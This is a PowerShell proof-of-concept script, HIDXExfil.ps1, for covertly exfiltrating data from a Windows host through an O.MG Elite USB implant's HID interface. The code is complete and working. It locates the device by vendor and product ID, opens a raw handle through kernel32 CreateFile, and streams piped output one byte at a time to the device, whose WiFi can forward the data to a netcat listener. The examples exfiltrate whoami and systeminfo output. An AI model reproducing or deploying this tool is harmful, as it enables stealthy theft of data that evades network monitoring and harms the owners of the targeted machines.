<#
HIDXExfil.ps1
Author: [REDACTED] (@01p8or13)
Acknowledgements: spiceywasabi, rogandawes
Required Dependencies: Activated HIDX on OMG Elite device
#>

function HIDXExfil {
<#
.DESCRIPTION
A “low and slow” method of covert exfiltration meant to provide alternate 
pentesting pathways beyond using the target host’s network interfaces or 
mass storage.
This POC will allow data exfiltration back to the O.MG’s flash storage or
act as a proxy between the target host and another device via the O.MG
Device's built in WiFi interface which can allow you to recieve listeners 
via nc, netcat, or similar tools.

.PARAMETER Message
Message which gets exfiltrated.

.PARAMETER VendorID
Defining vendor ID of the device. (Default: D3C0)

.PARAMETER ProductID
Defining product ID of the device. (Default: D34D)

.EXAMPLE
Defining a message: 
HIDXpoc -Message "hello world"

.EXAMPLE
HIDX usage with every paramter: 
HIDXpoc -VendorID D3C0 -ProductID D34D -Message "test"

.EXAMPLE
Piping output into HIDX: 
whoami | HIDXpoc

.EXAMPLE
Exfiltrating systeminfo with proper formatting:
systeminfo | Out-String | HIDXpoc

.LINK
https://github.com/0iphor13
https://github.com/spiceywasabi
https://github.com/rogandawes

#Credits to Rogan for idea of filehandle and device identification
#>

    [cmdletbinding()]
    param(
        [Parameter(
            Mandatory = $true,
            ValueFromPipeline = $true)]
            $Message,

        [Parameter(Position = 1)]
            [ValidateNotNullOrEmpty()]
            [String]
            $VendorID = "D3C0", #Default value

        [Parameter(Position = 2)]
            [ValidateNotNullOrEmpty()]
            [String]
            $ProductID = "D34D" # Default value
    )

    function Get-OMGDevice {
        param(
            $vendorID,
            $productID
        )

        $omg = $vendorID + "&PID_" + $productID
        $devs = gwmi Win32_USBControllerDevice

        foreach ($dev in $devs) {
            $wmidev = [wmi]$dev.Dependent
            if ($wmidev.GetPropertyValue('DeviceID') -match ($omg) -and 
                ($wmidev.GetPropertyValue('Service') -eq $null)) {
                return ([char]92+[char]92+'?'+[char]92 + 
                    $wmidev.GetPropertyValue('DeviceID').ToString().Replace([char]92,[char]35) 
                    + [char]35+'{4d1e55b2-f16f-11cf-88cb-001111000030}')
            }
        }

        return $null
    }


    function Send-Payload {
        param(
            $fileHandle,
            $payload
        )

        $payloadLength = $payload.Length
        $chunkSize = 1
        $chunkNr = [Math]::Ceiling($payloadLength / $chunkSize)

        $bytes = New-Object Byte[] (65)
        $fileHandle.Write($bytes, 0, 65)

        for ($i = 0; $i -lt $chunkNr; $i++) {
            $start = $i * $chunkSize
            $end = [Math]::Min(($i + 1) * $chunkSize, $payloadLength)
            $chunkLen = $end - $start
            $payloadChunk = New-Object Byte[] $chunkLen
            [System.Buffer]::BlockCopy($payload, $start, $payloadChunk, 0, $chunkLen)
            $bytes[1] = $chunkLen
            [System.Buffer]::BlockCopy($payloadChunk, 0, $bytes, 2, $chunkLen)
            $fileHandle.Write($bytes, 0, 65)
        }
    }

    $cs = @"
    using System;
    using System.IO;
    using Microsoft.Win32.SafeHandles;
    using System.Runtime.InteropServices;
    namespace omg {
        public class hidx {
            [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            public static extern SafeFileHandle CreateFile(String fn, UInt32 da, Int32 sm, IntPtr sa, Int32 cd, uint fa, IntPtr tf);
            public static FileStream open(string fn) {
                return new FileStream(CreateFile(fn, 0XC0000000U, 3, IntPtr.Zero, 3, 0x40000000, IntPtr.Zero), FileAccess.ReadWrite, 9, true);
            }
        }
    }
"@
    Add-Type -TypeDefinition $cs

    try {
        $deviceString = Get-OMGDevice -vendorID $VendorID -productID $ProductID

        if ($deviceString -eq $null) {
            Write-Host -ForegroundColor Red "[!]Error: Could not find OMG device - Check VID/PID"
            return
        }

        $fileHandle = [omg.hidx]::open($deviceString)

        if ($fileHandle -eq $null) {
            Write-Host -ForegroundColor Red "[!]Error: Filehandle is empty"
            return
        }

        $payload = [System.Text.Encoding]::UTF8.GetBytes($Message + "`n")
        Send-Payload -fileHandle $fileHandle -payload $payload

    } catch {
        Write-Host -ForegroundColor Red "[!]Error: $($PSItem.Exception.Message)"
    } finally {
        if ($fileHandle -ne $null) {
            $fileHandle.Close()
        }
    }
}